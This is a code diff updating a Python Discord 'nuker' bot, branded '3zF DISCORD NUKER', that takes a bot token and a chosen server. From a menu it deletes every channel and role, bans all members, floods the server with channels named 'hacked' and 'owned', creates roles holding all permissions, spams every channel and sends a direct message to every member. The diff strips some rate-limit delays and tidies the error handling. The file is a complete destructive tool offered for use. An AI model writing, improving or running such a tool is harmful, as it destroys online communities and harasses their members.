@@ -12,7 +12,7 @@ client = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 guild_target = None
 running = True
 cnt = {"v": 0}
-chan_list = ["nuked-by-bot", "get-rekt", "owned"]
+chan_list = ["hacked", "rekt", "owned"]
 role_list = ["nuked", "rekt", "owned"]
 
 R = "\033[91m"
@@ -24,16 +24,18 @@ async def on_ready():
     global guild_target
     os.system("cls || clear")
     
-    print(f"{R}[+] LOGGED AS: {W}{client.user}{X}")
-    print(f"{R}============================={X}")
+    banner()
     
     guilds = list(client.guilds)
+    print(f"\n{R}[>] LOGGED AS : {W}{client.user}{X}")
+    print(f"{R}============================================================{X}")
+    
     for i, g in enumerate(guilds):
-        print(f"{R}[{i+1}] {W}{g.name} ({g.id}){X}")
+        print(f"{R}  [{i+1}] {W}{g.name} {R}({g.id}){X}")
     
     while True:
         try:
-            ch = int(input(f"\n{R}[>] SELECT SERVER: {W}")) - 1
+            ch = int(input(f"\n{R}[>] SELECT SERVER : {W}")) - 1
             if 0 <= ch < len(guilds):
                 guild_target = guilds[ch]
                 break
@@ -41,47 +43,63 @@ async def on_ready():
             pass
     
     os.system("cls || clear")
-    print(f"{R}[+] TARGET: {W}{guild_target.name}{X}")
-    print(f"{R}============================={X}")
+    show_target()
     await show_menu()
 
-async def safe_delete_channel(channel):
-    try:
-        await channel.delete()
-        cnt["v"] += 1
-        print(f"{R}[+] DELETED: {W}{channel.name}{X}")
-    except discord.Forbidden:
-        pass
-    except discord.HTTPException:
-        await asyncio.sleep(1)
-        await safe_delete_channel(channel)
+def banner():
+    print(f"""{R}
+██████╗ ███████╗██╗  ██╗██████╗ 
+╚════██╗██╔════╝██║ ██╔╝██╔══██╗
+ █████╔╝╚█████╗ █████╔╝ ██████╔╝
+ ╚═══██╗ ╚═══██╗██╔═██╗ ██╔══██╗
+██████╔╝██████╔╝██║  ██╗██║  ██║
+╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
+{R}============================================================{X}
+{R}  DEVELOPER : 3zF (Fixed){X}
+{R}  TOOL      : DISCORD NUKER{X}
+{R}============================================================{X}
+    """)
 
-async def safe_send(channel, msg):
-    try:
-        await channel.send(msg)
-        cnt["v"] += 1
-        return True
-    except:
-        return False
+def show_target():
+    print(f"""{R}
+██████╗ ███████╗██╗  ██╗██████╗ 
+╚════██╗██╔════╝██║ ██╔╝██╔══██╗
+ █████╔╝╚█████╗ █████╔╝ ██████╔╝
+ ╚═══██╗ ╚═══██╗██╔═██╗ ██╔══██╗
+██████╔╝██████╔╝██║  ██╗██║  ██║
+╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
+{R}============================================================{X}
+{R}  TARGET : {W}{guild_target.name}{X}
+{R}  ID      : {W}{guild_target.id}{X}
+{R}============================================================{X}
+    """)
 
 async def show_menu():
     global running
     while running:
-        print(f"\n{R}┌──────────────────────┐{X}")
-        print(f"{R}│   {W}NUKER MENU{R}        │{X}")
-        print(f"{R}├──────────────────────┤{X}")
-        print(f"{R}│ {W}[1] DELETE CHANNELS{R}  │{X}")
-        print(f"{R}│ {W}[2] DELETE ROLES{R}     │{X}")
-        print(f"{R}│ {W}[3] BAN ALL MEMBERS{R}   │{X}")
-        print(f"{R}│ {W}[4] CREATE CHANNELS{R}   │{X}")
-        print(f"{R}│ {W}[5] CREATE ROLES{R}      │{X}")
-        print(f"{R}│ {W}[6] SPAM MESSAGES{R}     │{X}")
-        print(f"{R}│ {W}[7] CHANGE NAME{R}       │{X}")
-        print(f"{R}│ {W}[8] DM ALL{R}            │{X}")
-        print(f"{R}│ {W}[0] EXIT{R}              │{X}")
-        print(f"{R}└──────────────────────┘{X}")
+        print("")
+        print(f"""{R}
+┌──────────────────────────────────────────────────────────┐
+│                                                          │
+│              {W}3ZF DISCORD NUKER{R}                          │
+│                                                          │
+│           {R}[1]{W}  DELETE CHANNELS{R}                         │
+│           {R}[2]{W}  DELETE ROLES{R}                             │
+│           {R}[3]{W}  BAN ALL MEMBERS{R}                          │
+│           {R}[4]{W}  CREATE CHANNELS{R}                           │
+│           {R}[5]{W}  CREATE ROLES{R}                              │
+│           {R}[6]{W}  SPAM MESSAGES{R}                             │
+│           {R}[7]{W}  CHANGE SERVER NAME{R}                        │
+│           {R}[8]{W}  DM ALL MEMBERS{R}                            │
+│           {R}[0]{W}  EXIT{R}                                      │
+│                                                          │
+└──────────────────────────────────────────────────────────┘
+        {X}""")
         
-        c = input(f"{R}[>] OPTION: {W}").strip()
+        try:
+            c = input(f"{R}[>] OPTION : {W}").strip()
+        except:
+            c = ""
         
         if c == "1": await del_chans()
         elif c == "2": await del_roles()
@@ -93,128 +111,148 @@ async def show_menu():
         elif c == "8": await dm_all()
         elif c == "0":
             running = False
+            print(f"{R}[+] BYE{X}")
             await client.close()
             os._exit(0)
 
 async def del_chans():
-    start = time.time()
     cnt["v"] = 0
-    for ch in guild_target.channels:
-        await safe_delete_channel(ch)
-    print(f"\n{R}[+] {W}{cnt['v']} CHANNELS DELETED IN {time.time()-start:.2f}s{X}")
-    input(f"{R}[>] PRESS ENTER{X}")
+    start = time.time()
+    chs = guild_target.channels
+    for ch in chs:
+        try:
+            await ch.delete()
+            cnt["v"] += 1
+            print(f"{R}[+] {W}DELETED: {ch.name}{X}")
+        except Exception as e:
+            print(f"{R}[-] {W}FAILED: {ch.name} - {e}{X}")
+    print(f"\n{R}[+] {W}{cnt['v']}{R} CHANNELS DELETED {W}[{time.time()-start:.2f}s]{X}")
+    input(f"{R}[>] ENTER{X}")
 
 async def del_roles():
-    start = time.time()
     cnt["v"] = 0
-    for r in guild_target.roles:
-        if r.name != "@everyone":
-            try:
-                await r.delete()
-                cnt["v"] += 1
-                print(f"{R}[+] DELETED: {W}{r.name}{X}")
-            except:
-                pass
-    print(f"\n{R}[+] {W}{cnt['v']} ROLES DELETED IN {time.time()-start:.2f}s{X}")
-    input(f"{R}[>] PRESS ENTER{X}")
+    start = time.time()
+    roles = [r for r in guild_target.roles if r.name != "@everyone"]
+    for r in roles:
+        try:
+            await r.delete()
+            cnt["v"] += 1
+            print(f"{R}[+] {W}DELETED: {r.name}{X}")
+        except Exception as e:
+            print(f"{R}[-] {W}FAILED: {r.name} - {e}{X}")
+    print(f"\n{R}[+] {W}{cnt['v']}{R} ROLES DELETED {W}[{time.time()-start:.2f}s]{X}")
+    input(f"{R}[>] ENTER{X}")
 
 async def ban_all():
-    if input(f"{R}[>] TYPE 'yes': {W}").lower() != "yes":
+    print(f"\n{R}[!] THIS WILL BAN EVERYONE{X}")
+    confirm = input(f"{R}[>] TYPE yes : {W}")
+    if confirm.lower() != "yes":
+        print(f"{R}[-] CANCELLED{X}")
+        input(f"{R}[>] ENTER{X}")
         return
-    start = time.time()
     cnt["v"] = 0
+    start = time.time()
     await guild_target.fetch_members()
-    for m in guild_target.members:
-        if m.id != client.user.id:
-            try:
-                await m.ban(reason="Nuked")
-                cnt["v"] += 1
-                print(f"{R}[+] BANNED: {W}{m.name}{X}")
-                await asyncio.sleep(0.5)
-            except:
-                pass
-    print(f"\n{R}[+] {W}{cnt['v']} MEMBERS BANNED IN {time.time()-start:.2f}s{X}")
-    input(f"{R}[>] PRESS ENTER{X}")
+    members = [m for m in guild_target.members if m.id != client.user.id]
+    for m in members:
+        try:
+            await m.ban(reason="3zF")
+            cnt["v"] += 1
+            print(f"{R}[+] {W}BANNED: {m.name}{X}")
+        except Exception as e:
+            print(f"{R}[-] {W}FAILED: {m.name} - {e}{X}")
+    print(f"\n{R}[+] {W}{cnt['v']}{R} MEMBERS BANNED {W}[{time.time()-start:.2f}s]{X}")
+    input(f"{R}[>] ENTER{X}")
 
 async def create_chans():
     try:
-        n = int(input(f"{R}[>] CHANNEL COUNT: {W}"))
+        n = int(input(f"{R}[>] HOW MANY CHANNELS : {W}"))
     except:
+        print(f"{R}[-] NUMBER{X}")
         return
-    start = time.time()
     cnt["v"] = 0
+    start = time.time()
     for i in range(n):
-        name = chan_list[i % len(chan_list)]
         try:
+            name = chan_list[i % len(chan_list)]
             await guild_target.create_text_channel(name)
             cnt["v"] += 1
-            print(f"{R}[+] CREATED: {W}{name}{X}")
-            await asyncio.sleep(0.5)
-        except:
-            pass
-    print(f"\n{R}[+] {W}{cnt['v']} CHANNELS CREATED IN {time.time()-start:.2f}s{X}")
-    input(f"{R}[>] PRESS ENTER{X}")
+            print(f"{R}[+] {W}CREATED: {name}{X}")
+        except Exception as e:
+            print(f"{R}[-] {W}FAILED: {name} - {e}{X}")
+    print(f"\n{R}[+] {W}{cnt['v']}{R} CHANNELS CREATED {W}[{time.time()-start:.2f}s]{X}")
+    input(f"{R}[>] ENTER{X}")
 
 async def create_roles():
     try:
-        n = int(input(f"{R}[>] ROLE COUNT: {W}"))
+        n = int(input(f"{R}[>] HOW MANY ROLES : {W}"))
     except:
+        print(f"{R}[-] NUMBER{X}")
         return
-    start = time.time()
     cnt["v"] = 0
+    start = time.time()
     for i in range(n):
-        name = role_list[i % len(role_list)]
         try:
-            await guild_target.create_role(name=name, color=discord.Color.from_rgb(random.randint(0,255), random.randint(0,255), random.randint(0,255)))
+            name = role_list[i % len(role_list)]
+            color = random.randint(0, 0xFFFFFF)
+            await guild_target.create_role(name=name, color=discord.Color(color), permissions=discord.Permissions.all())
             cnt["v"] += 1
-            print(f"{R}[+] CREATED: {W}{name}{X}")
-        except:
-            pass
-    print(f"\n{R}[+] {W}{cnt['v']} ROLES CREATED IN {time.time()-start:.2f}s{X}")
-    input(f"{R}[>] PRESS ENTER{X}")
+            print(f"{R}[+] {W}CREATED: {name}{X}")
+        except Exception as e:
+            print(f"{R}[-] {W}FAILED: {name} - {e}{X}")
+    print(f"\n{R}[+] {W}{cnt['v']}{R} ROLES CREATED {W}[{time.time()-start:.2f}s]{X}")
+    input(f"{R}[>] ENTER{X}")
 
 async def spam_all():
     try:
-        per = int(input(f"{R}[>] PER CHANNEL: {W}"))
+        per = int(input(f"{R}[>] PER CHANNEL : {W}"))
     except:
+        print(f"{R}[-] NUMBER{X}")
         return
-    msg = input(f"{R}[>] MESSAGE: {W}")
-    start = time.time()
+    msg = input(f"{R}[>] MESSAGE : {W}")
     cnt["v"] = 0
-    for ch in guild_target.text_channels:
+    start = time.time()
+    chs = [c for c in guild_target.text_channels]
+    for ch in chs:
         for i in range(per):
-            await safe_send(ch, msg)
-    print(f"\n{R}[+] {W}{cnt['v']} MESSAGES SENT IN {time.time()-start:.2f}s{X}")
-    input(f"{R}[>] PRESS ENTER{X}")
+            try:
+                await ch.send(msg)
+                cnt["v"] += 1
+                print(f"{R}[+] {W}SENT: {ch.name} [{i+1}/{per}]{X}")
+            except Exception as e:
+                print(f"{R}[-] {W}FAILED: {ch.name} - {e}{X}")
+                break
+    print(f"\n{R}[+] {W}{cnt['v']}{R} MESSAGES SENT {W}[{time.time()-start:.2f}s]{X}")
+    input(f"{R}[>] ENTER{X}")
 
 async def change_name():
-    name = input(f"{R}[>] NEW NAME: {W}")
+    name = input(f"{R}[>] NEW NAME : {W}")
     try:
         await guild_target.edit(name=name)
         print(f"{R}[+] NAME CHANGED TO: {W}{name}{X}")
-    except:
-        pass
-    input(f"{R}[>] PRESS ENTER{X}")
+    except Exception as e:
+        print(f"{R}[-] FAILED: {e}{X}")
+    input(f"{R}[>] ENTER{X}")
 
 async def dm_all():
-    msg = input(f"{R}[>] MESSAGE: {W}")
-    start = time.time()
+    msg = input(f"{R}[>] MESSAGE : {W}")
     cnt["v"] = 0
+    start = time.time()
     await guild_target.fetch_members()
-    for m in guild_target.members:
-        if m.id != client.user.id:
-            try:
-                await m.send(msg)
-                cnt["v"] += 1
-                print(f"{R}[+] DM SENT: {W}{m.name}{X}")
-                await asyncio.sleep(0.5)
-            except:
-                pass
-    print(f"\n{R}[+] {W}{cnt['v']} DMS SENT IN {time.time()-start:.2f}s{X}")
-    input(f"{R}[>] PRESS ENTER{X}")
+    members = [m for m in guild_target.members if m.id != client.user.id]
+    for m in members:
+        try:
+            await m.send(msg)
+            cnt["v"] += 1
+            print(f"{R}[+] {W}DM SENT: {m.name}{X}")
+            await asyncio.sleep(0.3)
+        except Exception as e:
+            print(f"{R}[-] {W}FAILED: {m.name} - {e}{X}")
+    print(f"\n{R}[+] {W}{cnt['v']}{R} DMS SENT {W}[{time.time()-start:.2f}s]{X}")
+    input(f"{R}[>] ENTER{X}")
 
 while True:
-    token = input(f"\n{R}[>] TOKEN: {W}").strip()
+    token = input(f"\n{R}[>] TOKEN : {W}").strip()
     if token:
         break
 
@@ -222,6 +260,7 @@ try:
     client.run(token, reconnect=True)
 except:
     os.system("cls || clear")
-    print(f"{R}[-] INVALID TOKEN{X}")
+    banner()
+    print(f"{R}[-] INVALID TOKEN OR ERROR{X}")
     time.sleep(2)
     os.execl(sys.executable, sys.executable, *sys.argv)
